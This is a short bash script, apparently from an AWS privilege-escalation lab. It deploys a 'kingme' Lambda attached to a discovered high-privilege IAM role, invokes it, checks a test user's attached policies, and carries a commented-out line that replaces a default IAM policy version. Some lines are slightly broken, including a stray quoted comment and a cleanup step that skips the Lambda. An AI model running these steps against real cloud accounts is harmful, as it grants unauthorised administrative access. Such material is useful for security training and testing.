#!/bin/bash

source env.sh

It also creates a high privilege Lambda.
Be sure to delete the user and lambda afterwards by passing --delete to this script.'

role_arn=`aws iam get-role --role-name ${DISCOVERED_ROLE_NAME} | jq '.Role.Arn'  | sed 's|\"||g'`

# must match group name in create_groups.sh
GROUP_NAME=PowerUserAccess-marketing-group-${RAND}

USER_NAME=marketing-dave-${RAND}

if [ $1 == "--delete" ]; then
  aws iam delete-user --user-name $USER_NAME
  exit 0
fi





aws lambda create-function \
    --function-name kingme \
    --runtime python3.8 \
    --zip-file fileb://kingme.zip \
    --handler kingme.handler \
    --role $role_arn


aws lambda invoke --function-name kingme kingme.out --log-type Tail --query 'LogResult' --output text |  base64 -D

aws iam list-attached-user-policies  --user-name $USER_NAME

# aws --profile default iam create-policy-version --policy-arn arn:aws:iam::111111111111:policy/update_iam_policy_xxkd93jal0 --policy-document file://lambda_permissions_policy_doc.json --set-as-default

